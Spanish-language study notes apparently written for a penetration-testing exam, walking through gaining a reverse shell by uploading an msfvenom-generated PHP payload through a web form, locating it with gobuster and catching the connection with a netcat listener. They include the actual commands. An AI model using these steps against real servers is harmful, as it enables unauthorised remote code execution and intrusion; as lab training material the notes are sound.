
Vamos a ver cómo podemos generar un payload en PHP que podamos subir al servidor y así obtener acceso a la máquina víctima. Para ello, vamos a acceder a un servidor FTP como Anonymous, que será donde subamos nuestro payload y adquirir esa intrusión al servidor.

Si nos encontramos una Web de login lo primero que tenemos que hacer si se puede es crearse una cuenta.
Lo segundo que habría que car si hemos conseguido registrar un usuario es, si la web tiene por algún lado el nombre de la Web o el tipo de servicio como por ejemplo Apache, Tomcat... la buscamos en [[METASPLOIT]] SIEMPRE por si acaso hay un exploit para ello.
En tercer lugar lo que tendremos que hacer es ver si la Web tiene alguna opción para subir archivos. Si lo tiene tendremos que crear un archivo malicioso con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]], una vez subirlo saber donde se guarda este archivo en la maquina victima lo haremos con Fuzzing.

Vamos a crear el Payload con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
` msfvenom -p php/reverse_php LHOST=192.168.1.19 LPORT=443 raw > pwned.php`

Subimos el archivo a la Web.
Ahora tenemos que saber donde se ubica el archivo usamos para esto [[00. Apuntes/01. Herramientas/GOBUSTER|GOBUSTER]]
`gobuster dir -u http://192.168.1.19/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

Encontraremos la dirección donde se suben los archivos y navegamos a ella.
Tendremos que ponernos en escucha con [[NETCAT]] en el puerto que hemos indicado en el [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`nc -lvnp 443`

Y hacer click en el archivo que hemos subido a la ruta

Los payloads de [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] funcionan mal así que es aconsejable buscar la reverse shell en https://www.revshells.com/  
Nos lo tendremos que abrir fuera de la maquina del examen y una vez tenemos conexión a través de [[NETCAT]] añadimos el payload que nos ha generado la web.
Hay que tener en otra terminal un [[NETCAT]] en otro puerto diferente con el que tenemos con la maquina victima.

